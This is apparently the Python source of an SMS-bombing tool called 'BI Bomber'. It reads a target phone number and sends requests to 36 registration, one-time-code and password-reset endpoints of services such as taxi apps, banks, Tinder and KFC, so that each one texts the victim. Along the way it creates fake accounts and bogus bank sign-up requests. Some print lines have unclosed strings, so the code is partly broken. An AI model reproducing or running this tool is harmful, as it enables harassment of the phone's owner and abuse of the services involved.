import threading
import time
import requests, random, datetime, sys, time, argparse, os

green_c = '\33[92m'
reset_c = '\033[0m'

print(green_c + " ____    _____   ____                        _                   " + reset_c)
print(green_c + "|  _ \  |_   _| |  _ \                      | |                  " + reset_c)
print(green_c + "| |_) |   | |   | |_) |   ___    _ __ ___   | |__     ___   _ __ " + reset_c)
print(green_c + "|  _ <    | |   |  _ <   / _ \  | '_ ` _ \  | '_ \   / _ \ | '__|" + reset_c)
print(green_c + "| |_) |  _| |_  | |_) | | (_) | | | | | | | | |_) | |  __/ | |   " + reset_c)
print(green_c + "|____/  |_____| |____/   \___/  |_| |_| |_| |_.__/   \___| |_|   " + reset_c)
print("\n\n)
print("GITHUB: https://github.com/bikmeev/bi_bomber")
print("\n\n)

phone = input("\033[32m Введите номер +")

def qw(_phone):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone

_phone = phone
_name = ''

for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    s = 0
    iteration = 0
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'


isActive = True
errCount = 0
SucCount = 0

while isActive == True:

    try:
        print("processing... 1/36")
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    except:
        errCount += 1
    try:
        print("processing... 2/36")
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
    except:
        errCount += 1

    try:
        print("processing...  3/36")
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
    except:
        errCount += 1

    try:
        print("processing... 4/36")
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={})
    except:
        errCount += 1

    try:
        print("processing...  5/36")
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
    except:
        errCount += 1

    try:
        print("processing... 6/36")
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
    except:
        errCount += 1

    try:
        print("processing... 7/36")
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
    except:
        errCount += 1

    try:
        print("processing... 8/36")
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    except:
        errCount += 1

    try:
        print("processing... 9/36")
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'})
    except:
        errCount += 1

    try:
        print("processing... 10/36")
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
    except:
        errCount += 1

    try:
        print("processing... 11/36")
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        errCount += 1

    try:
        print("processing... 12/36")
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
    except:
        errCount += 1

    try:
        print("processing... 13/36")
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    except:
        errCount += 1

    try:
        print("processing... 14/36")
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
    except:
        errCount += 1


    try:
        print("processing... 15/36")
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
    except:
        errCount += 1

    try:
        print("processing... 16/36")
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
    except:
        errCount += 1

    try:
        print("processing...  17/36")
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
    except:
        errCount += 1
    try:
        print("processing...  18/36")
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'})
    except:
        errCount += 1

    try:
        print("processing...  19/36")
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
    except:
        errCount += 1

    try:
        print("processing...  20/36")
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'})
    except:
        errCount += 1

    try:
        print("processing...  21/36")
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
    except:
        errCount += 1

    try:
        print("processing... 22/36")
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
    except:
        errCount += 1

    try:
        print("processing...  23/36")
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
    except:
        errCount += 1

    try:
        print("processing... 24/36")
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
    except:
        errCount += 1

    try:
        print("processing... 25/36")
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        errCount += 1

    try:
        print("processing... 26/36")
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
    except:
        errCount += 1

    try:
        print("processing... 27/36")
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
    except:
        errCount += 1

    try:
        print("processing... 28/36")
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    except:
        errCount += 1

    try:
        print("processing... 29/36")
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
    except:
        errCount += 1

    try:
        print("processing... 30/36")
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        errCount += 1

    try:
        print("processing... 31/36")
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
    except:
        errCount += 1

    try:
        print("processing... 32/36")
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
    except:
        errCount += 1

    try:
        print("processing... 33/36")
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    except:
        errCount += 1

    try:
        print("processing... 34/36")
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})

    except:
        errCount += 1

    try:
        print("processing... 35/36")
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
    except:
        errCount += 1
    
    try:
        print("processing... 36/36")
        r = requests.post("https://api.fix-price.com/buyer/v2/registration/phone/request", data={"phone": _phone})

    except:
        errCount += 1

    isActive = False
    print("всего неудачных отправок "+str(errCount)+" из 36")
